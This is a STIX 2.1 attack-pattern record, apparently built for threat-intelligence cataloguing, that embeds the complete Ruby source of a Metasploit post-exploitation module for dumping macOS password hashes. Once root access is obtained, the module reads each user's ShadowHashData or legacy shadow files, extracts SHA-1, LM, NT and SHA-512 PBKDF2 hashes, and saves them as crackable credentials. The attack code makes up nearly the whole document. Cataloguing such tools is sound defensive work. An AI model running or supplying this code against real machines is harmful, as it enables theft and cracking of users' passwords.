{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aeb4f208-0488-452a-8f55-63726014242e",
    "created": "2024-08-14T16:33:00.702286Z",
    "modified": "2024-08-14T16:33:00.70229Z",
    "name": "OS X Gather Mac OS X Password Hash Collector",
    "description": " This module dumps SHA-1, LM, NT, and SHA-512 Hashes on OSX. Supports versions 10.3 to 10.14.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/osx/gather/hashdump.rb",
            "external_id": "hashdump.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Post\n  # set of accounts to ignore while pilfering data\n  # OSX_IGNORE_ACCOUNTS = [\"Shared\", \".localized\"]\n\n  include Msf::Post::File\n  include Msf::Post::OSX::Priv\n  include Msf::Post::OSX::System\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OS X Gather Mac OS X Password Hash Collector',\n        'Description' => %q{\n          This module dumps SHA-1, LM, NT, and SHA-512 Hashes on OSX. Supports\n          versions 10.3 to 10.14.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Carlos Perez <carlos_perez[at]darkoperator.com>',\n          'hammackj <jacob.hammack[at]hammackj.com>',\n          'joev'\n        ],\n        'Platform' => [ 'osx' ],\n        'SessionTypes' => %w[shell meterpreter]\n      )\n    )\n    register_options([\n      OptRegexp.new('MATCHUSER', [\n        false,\n        'Only attempt to grab hashes for users whose name matches this regex'\n      ])\n    ])\n  end\n\n  # Run Method for when run command is issued\n  def run\n    unless is_root?\n      fail_with(Failure::BadConfig, 'Insufficient Privileges: must be running as root to dump the hashes')\n    end\n\n    # iterate over all users\n    get_nonsystem_accounts.each do |user_info|\n      user = user_info['name']\n      next if datastore['MATCHUSER'].present? && datastore['MATCHUSER'] !~ (user)\n\n      print_status \"Attempting to grab shadow for user #{user}...\"\n      if gt_lion? # 10.8+\n        # pull the shadow from dscl\n        shadow_bytes = grab_shadow_blob(user)\n        next if shadow_bytes.blank?\n\n        # on 10.8+ ShadowHashData stores a binary plist inside of the user.plist\n        # Here we pull out the binary plist bytes and use built-in plutil to convert to xml\n        plist_bytes = shadow_bytes.split('').each_slice(2).map { |s| \"\\\\x#{s[0]}#{s[1]}\" }.join\n\n        # encode the bytes as \\x hex string, print using bash's echo, and pass to plutil\n        shadow_plist = cmd_exec(\"/bin/bash -c 'echo -ne \\\"#{plist_bytes}\\\" | plutil -convert xml1 - -o -'\")\n\n        # read the plaintext xml\n        shadow_xml = REXML::Document.new(shadow_plist)\n\n        # parse out the different parts of sha512pbkdf2\n        dict = shadow_xml.elements[1].elements[1].elements[2]\n        entropy = Rex::Text.to_hex(dict.elements[2].text.gsub(/\\s+/, '').unpack('m*')[0], '')\n        iterations = dict.elements[4].text.gsub(/\\s+/, '')\n        salt = Rex::Text.to_hex(dict.elements[6].text.gsub(/\\s+/, '').unpack('m*')[0], '')\n\n        # PBKDF2 stored in <iterations, salt, entropy> format\n        decoded_hash = \"$ml$#{iterations}$#{salt}$#{entropy}\"\n        report_hash('SHA-512 PBKDF2', decoded_hash, user)\n      elsif lion? # 10.7\n        # pull the shadow from dscl\n        shadow_bytes = grab_shadow_blob(user)\n        next if shadow_bytes.blank?\n\n        # on 10.7 the ShadowHashData is stored in plaintext\n        hash_decoded = shadow_bytes.downcase\n\n        # Check if NT HASH is present\n        if hash_decoded =~ /4f1010/\n          report_hash('NT', hash_decoded.scan(/^\\w*4f1010(\\w*)4f1044/)[0][0], user)\n        end\n\n        # slice out the sha512 hash + salt\n        # original regex left for historical purposes.  During testing it was discovered that\n        # 4f110200 was also a valid end.  Instead of looking for the end, since its a hash (known\n        # length) we can just set the length\n        # sha512 = hash_decoded.scan(/^\\w*4f1044(\\w*)(080b190|080d101e31)/)[0][0]\n        sha512 = hash_decoded.scan(/^\\w*4f1044(\\w{136})/)[0][0]\n        report_hash('SHA-512', sha512, user)\n      else # 10.6 and below\n        # On 10.6 and below, SHA-1 is used for encryption\n        guid = if gte_leopard?\n                 cmd_exec(\"/usr/bin/dscl localhost -read /Search/Users/#{user} | grep GeneratedUID | cut -c15-\").chomp\n               elsif lte_tiger?\n                 cmd_exec(\"/usr/bin/niutil -readprop . /users/#{user} generateduid\").chomp\n               end\n\n        # Extract the hashes\n        sha1_hash = cmd_exec(\"cat /var/db/shadow/hash/#{guid} | cut -c169-216\").chomp\n        nt_hash = cmd_exec(\"cat /var/db/shadow/hash/#{guid} | cut -c1-32\").chomp\n        lm_hash = cmd_exec(\"cat /var/db/shadow/hash/#{guid} | cut -c33-64\").chomp\n\n        # Check that we have the hashes and save them\n        if sha1_hash !~ /0000000000000000000000000/\n          report_hash('SHA-1', sha1_hash, user)\n        end\n        if nt_hash !~ /000000000000000/\n          report_hash('NT', nt_hash, user)\n        end\n        if lm_hash !~ /0000000000000/\n          report_hash('LM', lm_hash, user)\n        end\n      end\n    end\n  end\n\n  private\n\n  # @return [Bool] system version is at least 10.5\n  def gte_leopard?\n    ver_num =~ /10\\.(\\d+)/ and ::Regexp.last_match(1).to_i >= 5\n  end\n\n  # @return [Bool] system version is at least 10.8\n  def gt_lion?\n    ver_num =~ /10\\.(\\d+)/ and ::Regexp.last_match(1).to_i >= 8\n  end\n\n  # @return [String] hostname\n  def host\n    session.session_host\n  end\n\n  # @return [Bool] system version is 10.7\n  def lion?\n    ver_num =~ /10\\.(\\d+)/ and ::Regexp.last_match(1).to_i == 7\n  end\n\n  # @return [Bool] system version is 10.4 or lower\n  def lte_tiger?\n    ver_num =~ /10\\.(\\d+)/ and ::Regexp.last_match(1).to_i <= 4\n  end\n\n  # parse the dslocal plist in lion\n  def read_ds_xml_plist(plist_content)\n    doc = REXML::Document.new(plist_content)\n    keys = []\n    doc.elements.each('plist/dict/key') { |n| keys << n.text }\n\n    fields = {}\n    i = 0\n    doc.elements.each('plist/dict/array') do |element|\n      data = []\n      fields[keys[i]] = data\n      element.each_element('*') do |thing|\n        data_set = thing.text\n        if data_set\n          data << data_set.gsub(\"\\n\\t\\t\", '')\n        else\n          data << data_set\n        end\n      end\n      i += 1\n    end\n    return fields\n  end\n\n  # reports the hash info to metasploit backend\n  def report_hash(type, hash, user)\n    return unless hash.present?\n\n    print_good(\"#{type}:#{user}:#{hash}\")\n    case type\n    when 'NT'\n      private_data = \"#{Metasploit::Credential::NTLMHash::BLANK_LM_HASH}:#{hash}\"\n      private_type = :ntlm_hash\n      jtr_format = 'ntlm'\n    when 'LM'\n      private_data = \"#{hash}:#{Metasploit::Credential::NTLMHash::BLANK_NT_HASH}\"\n      private_type = :ntlm_hash\n      jtr_format = 'lm'\n    when 'SHA-512 PBKDF2'\n      private_data = hash\n      private_type = :nonreplayable_hash\n      jtr_format = 'PBKDF2-HMAC-SHA512'\n    when 'SHA-512'\n      private_data = hash\n      private_type = :nonreplayable_hash\n      jtr_format = 'xsha512'\n    when 'SHA-1'\n      private_data = hash\n      private_type = :nonreplayable_hash\n      jtr_format = 'xsha'\n    end\n    create_credential(\n      jtr_format: jtr_format,\n      workspace_id: myworkspace_id,\n      origin_type: :session,\n      session_id: session_db_id,\n      post_reference_name: refname,\n      username: user,\n      private_data: private_data,\n      private_type: private_type\n    )\n    print_status('Credential saved in database.')\n  end\n\n  # @return [String] containing blob for ShadowHashData in user's plist\n  # @return [nil] if shadow is invalid\n  def grab_shadow_blob(user)\n    shadow_bytes = cmd_exec(\"dscl . read /Users/#{user} dsAttrTypeNative:ShadowHashData\").gsub(/\\s+/, '')\n    return nil unless shadow_bytes.start_with? 'dsAttrTypeNative:ShadowHashData:'\n\n    # strip the other bytes\n    shadow_bytes.sub!(/^dsAttrTypeNative:ShadowHashData:/, '')\n  end\n\n  # @return [String] version string (e.g. 10.8.5)\n  def ver_num\n    @product_version ||= get_sysinfo['ProductVersion']\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'osx' ]"
    ]
}